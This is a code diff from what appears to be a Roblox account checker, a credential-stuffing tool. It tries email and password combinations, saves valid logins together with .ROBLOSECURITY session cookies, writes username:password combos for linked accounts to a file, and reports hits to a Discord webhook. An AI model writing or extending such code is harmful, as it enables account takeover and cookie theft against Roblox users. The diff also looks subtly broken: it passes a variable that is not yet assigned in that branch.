@@ -213,9 +213,10 @@ class Roblox:
                 if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
                     Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
-                    self.handle_multi(response.json())
+                    self.handle_multi(user_id_and_cookie)
 
                     self.checked = True
+                    continue
 
                 if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                     user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
@@ -537,23 +538,26 @@ class Roblox:
                     file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
 
     def handle_multi(self, user_id_and_cookie) -> None:
+        multiple_accounts_list = []
 
+        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]
 
-            combo = f"{multiple_account.get('name')}:{self.account[1]}\n"
-        self.accounts.insert(self.counter.get_value() + 1, combo)
+        for multiple_account in multiple_accounts:
+            multiple_accounts_list.append(f'{multiple_account.get("name")}:{self.account[1]}\n')
+
+        with self.lock.get_lock():
+            with open("output/multiple_linked.txt", "a", encoding="utf-8") as file:
+                file.writelines(multiple_accounts_list)
 
         if WEBHOOK_ENABLED:
             try:
                 webhook = DiscordWebhook(url=WEBHOOK, content="@here")
 
-                embed = DiscordEmbed(
-                    title=f'**Username: {self.account[0]}**',
-                    color='00FF00'
-                )
+                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')
 
                 embed.set_timestamp()
 
                 webhook.add_embed(embed)
                 webhook.execute()
-            except Exception:
+            except:
                 pass
